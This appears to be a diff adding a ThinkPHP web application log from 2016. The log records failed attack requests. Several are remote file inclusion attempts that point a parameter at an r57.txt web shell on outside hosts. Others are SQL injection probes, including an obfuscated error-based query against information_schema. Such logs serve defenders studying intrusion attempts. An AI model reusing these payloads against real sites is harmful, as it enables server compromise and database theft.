@@ -1,0 +1,42 @@
+[ 2016-03-09T04:19:48+08:00 ] 191.7.198.106 /index.php?m=http://sot.ae/templates/atomic/r57.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:Http://sot.ae/templates/atomic/r57.txt?
+
+[ 2016-03-09T04:57:04+08:00 ] 95.158.238.85 /index.php?m=Home'A=0&c=Article&a=detail&cid=38&id=225
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
+[ 2016-03-09T07:32:34+08:00 ] 186.247.202.36 /index.php?m=http://kleberantunes.com.br/images/r57.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
+ERR: _MODULE_NOT_EXIST_:Http://kleberantunes.com.br/images/r57.txt?
+
+[ 2016-03-09T07:34:27+08:00 ] 191.7.198.106 /index.php?m=http://sot.ae/templates/atomic/r57.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
+ERR: _MODULE_NOT_EXIST_:Http://sot.ae/templates/atomic/r57.txt?
+
+[ 2016-03-09T17:30:40+08:00 ] 95.158.238.85 /index.php?m='0=A&c=Article&a=detail&cid=38&id=225
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:'0=A
+
+[ 2016-03-09T17:30:40+08:00 ] 95.158.238.85 /index.php?m=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)&c=Article&a=detail&cid=38&id=225
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
+ERR: _MODULE_NOT_EXIST_:(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+[ 2016-03-09T17:53:46+08:00 ] 54.183.142.185 /index.php?m=Home'A=0&c=Product&a=goodsCatDetail&cid=359
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
